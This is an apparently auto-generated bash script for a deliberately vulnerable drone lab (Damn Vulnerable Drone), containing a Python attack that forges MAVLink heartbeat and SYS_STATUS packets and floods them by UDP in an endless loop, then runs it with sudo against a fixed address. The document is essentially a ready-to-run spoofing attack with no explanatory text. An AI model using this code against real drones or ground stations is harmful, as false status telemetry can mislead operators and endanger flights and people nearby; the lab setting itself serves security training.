#!/usr/bin/env bash
set -euo pipefail
export BASE="${BASE:-$PWD}"
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
  log(){ printf '[%(%F_%T)T] %s
' -1 "$*"; }
fi

# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/System-Status-Spoofing.md
# Created: 2025-09-10 04:31:52
# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.
set -euo pipefail

# 기준 경로 (요구사항)
export BASE="${BASE:-$PWD}"

# 공통 로그 연결(선택사항) - 존재 시 로드
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
  log(){ echo "[`date +%F_%T`] $*"; }; export -f log
fi

log "[ATTACK] id=system-status-spoofing src=System-Status-Spoofing.md"
log "[BLOCK 1] type=python"
python3 - <<'PY'
# --- argv glue for converter ---
import os, sys, re
if len(sys.argv) <= 1:
    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:127.0.0.1:14550')
    if ep.startswith('udp:'):
        try:
            _, rest = ep.split(':', 1)
            ep = rest
        except ValueError:
            pass
    # expect ip:port
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', ep):
        sys.argv = [sys.argv[0], ep]
from pymavlink import mavutil
from scapy.all import *
import time
import sys

def create_heartbeat():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.heartbeat_encode(
        type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
        autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
        base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        custom_mode=3,
        system_status=mavutil.mavlink.MAV_STATE_ACTIVE
    ).pack(mav)

def create_sys_status():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.sys_status_encode(
        onboard_control_sensors_present=0xFFFFFFFF,
        onboard_control_sensors_enabled=0xFFFFFFFF,
        onboard_control_sensors_health=0xFFFFFFFF,
        load=1000,
        voltage_battery=0,
        current_battery=-1,
        battery_remaining=-1,
        drop_rate_comm=0,
        errors_comm=0,
        errors_count1=0,
        errors_count2=0,
        errors_count3=0,
        errors_count4=0
    ).pack(mav)

def send_mavlink_packet(packet_data, target_ip, target_port):
    packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
    send(packet)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python sys-status-spoofing.py <ip:port>")
        sys.exit(1)

    target_ip, target_port = sys.argv[1].split(':')
    target_port = int(target_port)

    while True:
        send_mavlink_packet(create_heartbeat(), target_ip, target_port)
        send_mavlink_packet(create_sys_status(), target_ip, target_port)
        print(f"Sent heartbeat and SYS_STATUS packets to {target_ip}:{target_port}")
PY

log "[BLOCK 2] type=shell"
sudo python3 sys-status-spoofing.py 10.13.0.6:14550

